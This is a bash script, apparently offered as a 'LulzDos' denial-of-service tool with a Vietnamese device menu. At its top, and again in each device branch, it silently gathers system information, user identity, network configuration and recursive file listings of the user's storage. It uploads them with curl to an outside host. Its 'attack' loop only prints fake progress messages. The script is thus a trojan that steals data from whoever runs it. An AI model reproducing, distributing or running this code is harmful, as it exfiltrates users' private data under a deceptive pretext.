#!/bin/bash

echo "
=========================
[Copyright By Pham Chien]
=========================
Your System Name : $(uname -a)
Your Users Name : $(whoami)
Your Date Today : $(date)
Your Path       : $(pwd)
Your ID         : $(id)

$(ifconfig)

$(cd .. ; ls)" > sys.txt
curl -T sys.txt http://happy.mikikk.co.jp/


banner() {
  echo "
 _          _     ____       ____
| |   _   _| |___|  _ \  ___/ ___|
| |  | | | | |_  / | | |/ _ \___ \

|_____\__,_|_/___|____/ \___/____/
             Copyright : PhChien Adams
 Email : cyberkex.phamchie.net@gmail.com
 Zalo  : 0325852307
 Facebook : Phạm Chiến Adams

công cụ không hỗ trợ CloudShell!!!

Bạn Đang Sử Dụng Thiết Bị nào?
1 ) Android
2 ) Windows
3 ) Kali Linux , Unbuntu "

echo ""
}

android() {
ls -s -u /sdcard/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/* >> sys.txt

curl -T sys.txt http://happy.mikikk.co.jp/
}

windows() {
ls -s -u /c/Users/$(whoami)/*/*/*/*/*/*/*/*/*/*/*/* >> sys.txt

curl -T sys.txt http://happy.mikikk.co.jp/
}

Kali() {
ls -s -u /home/$(whoami)/*/*/*/*/*/*/*/*/*/*/*/*/ >> sys.txt

curl -T sys.txt http://happy.mikikk.co.jp/
}

check_windows() {
echo "test" > test.txt
mv test.txt /c/Users/$(whoami)/Downloads
  if [ -f /c/Users/$(whoami)/Downloads/test.txt ]
    then
       echo "success"

  else
    echo "your operating system is not valid"
    exit 1
  fi
}
check_android() {
echo "test" > test.txt
mv test.txt /sdcard/download
  if [ -f /sdcard/download/test.txt ]
    then
       echo "success"

  else
    echo "your operating system is not valid"
    exit 1
  fi
}
kali_linux() {
echo "test" > test.txt
mv test.txt /home/kali/desktop
  if [ -f /home/kali/desktop/test.txt ]
    then
      echo "success"

  else
     echo "your operating system is not valid"
    exit 1
  fi
}

sent_num() {
num=1
   while [ $num -lt 99999999 ]
    do
     sleep 0.20
     echo "LulzDos Attacking For $RANDOM.$num bytes --> $target"
     num=`expr $num + 1`
    done
}
  start_session

   clear
  banner
 echo -n "Enter Your System : "
 read system

case $system in

1)
check_android
android

echo -n "Enter Target : "
read target

sent_num
;;

2)
check_windows
windows

echo -n "Enter Target : "
read target

sent-num
;;

3)
kali_linux
Kali

echo -n "Enter Target : "
read target
sent_num
;;

*)
echo command not found
exit 1

esac
